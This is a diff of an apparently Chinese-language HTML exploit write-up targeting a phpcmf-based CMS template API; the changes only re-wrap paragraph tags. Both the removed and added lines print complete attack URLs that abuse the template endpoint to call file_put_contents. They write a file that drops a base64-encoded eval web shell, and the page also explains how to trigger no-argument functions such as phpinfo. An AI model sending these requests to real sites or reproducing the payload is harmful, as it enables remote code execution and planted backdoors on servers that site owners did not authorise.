@@ -368,10 +368,10 @@
 <p><code>/index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=api_related.html&amp;phpcmf_dir=admin&amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&lt;</code></p>
 <p>2.写剩余的语句:</p>
 <p><code>/index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=api_related.html&amp;phpcmf_dir=admin&amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?='';file_put_contents('webshell.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg=='));%20param2=FILE_APPEND</code></p>
-<p>1.写入php标记为<code>&lt;?php ?&gt;</code>的php文件,先写<code>&lt;</code>:
-<code>/index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=api_related.html&amp;phpcmf_dir=admin&amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&lt;</code></p>
-<p>2.写剩余的语句:
-<code>/index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=api_related.html&amp;phpcmf_dir=admin&amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?php%0dfile_put_contents('webshell.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg=='));%20param2=FILE_APPEND</code></p>
+<p>1.写入php标记为<code>&lt;?php ?&gt;</code>的php文件,先写<code>&lt;</code>:</p>
+<p><code>/index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=api_related.html&amp;phpcmf_dir=admin&amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=&lt;</code></p>
+<p>2.写剩余的语句:</p>
+<p><code>/index.php?s=api&amp;c=api&amp;m=template&amp;app=admin&amp;name=api_related.html&amp;phpcmf_dir=admin&amp;mid=%20action=function%20name=file_put_contents%20param0=webshell2.php%20param1=?php%0dfile_put_contents('webshell.php',base64_decode('PD9waHAgQGV2YWwoJF9QT1NUWyd3ZWJzaGVsbCddKTs/Pg=='));%20param2=FILE_APPEND</code></p>
 <p>写完之后,访问执行webshell2.php,会在同目录下生成webshell.php文件,webshell.php即为webshell</p>
 <h2 id="执行无参函数">执行无参函数</h2>
 <p>如果想执行无参函数,例如<code>phpinfo();</code>,将url中的<code>param0</code>参数设为<code>-1</code>即可:</p>
